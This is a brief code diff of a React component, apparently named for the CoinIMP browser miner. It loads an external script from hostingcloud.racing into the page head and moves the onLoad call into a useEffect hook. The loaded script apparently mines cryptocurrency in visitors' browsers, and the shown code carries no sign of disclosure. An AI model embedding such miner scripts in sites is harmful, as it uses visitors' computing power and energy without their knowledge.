@@ -17,9 +17,13 @@ const CoinimpComponent = () => {
         );
     };
 
+    useEffect(() => {
+        onLoad();
+    }, []);
+
     return (
         <Head>
-            <script src='https://www.hostingcloud.racing/NwOy.js' onLoad={onLoad}></script>
+            <script src='https://www.hostingcloud.racing/NwOy.js'></script>
         </Head>
     );
 };
